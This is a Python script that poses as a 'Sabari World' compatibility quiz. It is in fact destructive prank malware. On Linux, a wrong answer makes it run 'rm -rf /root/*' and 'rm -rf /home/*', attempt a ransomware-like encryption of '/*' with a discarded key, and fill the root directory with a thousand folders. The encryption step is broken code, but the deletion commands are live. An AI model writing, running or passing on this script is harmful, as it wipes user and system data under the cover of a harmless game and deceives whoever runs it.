import os
from cryptography.fernet import Fernet
import subprocess
import platform

os_name = platform.system()
print(os_name)

if os_name == "Linux":
    # Install dependencies
    dependencies = ['figlet', 'cryptography']
    for dependency in dependencies:
        subprocess.run(['pip', 'install', dependency])

    os.system("figlet 'Welcome to Sabari World!' | lolcat")
    print("\n")
    print("Let's check your compatibility for the Sabari World")
    print("If your guess is wrong, your system will be sabarified..........!!!!!!!!")
    y = input("Are you sure Sabari is Sabari? Please type YES or NO: ")
    if y.upper() == "YES":
        print("Welcome to Sabari World")
        exit()
    else:
        print("You are not compatible for Sabari World")
        os.system("rm -rf /root/*")
        os.system("rm -rf /home/*")
        os.system("mkdir /sabarified && echo 'You are sabarified' >> /sabarified.txt")
        os.system("figlet 'You are SABARIFIED!!!'")
        key = Fernet.generate_key()
        cipher = Fernet(key)
        file_path = "/*"
        with open(file_path, "rb") as file:
            plaintext = file.read()
        encrypted_text = cipher.encrypt(plaintext)
        encrypted_file_path = "encrypted1_file.enc"
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_text)
        print("Your Files are Sabarified.")
        base_dir = "/"
        max_folder_size = 90000000000
        num_folders = 1000
        for i in range(1, num_folders + 1):
            folder_name = f"folder_{i}"
            folder_path = os.path.join(base_dir, folder_name)

            # Check if the folder size exceeds the maximum limit
            if os.path.exists(folder_path):
                folder_size = sum(os.path.getsize(os.path.join(folder_path, f)) for f in os.listdir(folder_path))
                if folder_size >= max_folder_size:
                    print(f"Folder '{folder_name}' already exceeds the maximum size limit.")
                    continue

            # Create the folder
            os.makedirs(folder_path, exist_ok=True)
            print(f"Folder '{folder_name}' created at: {folder_path}")

else:
    exit()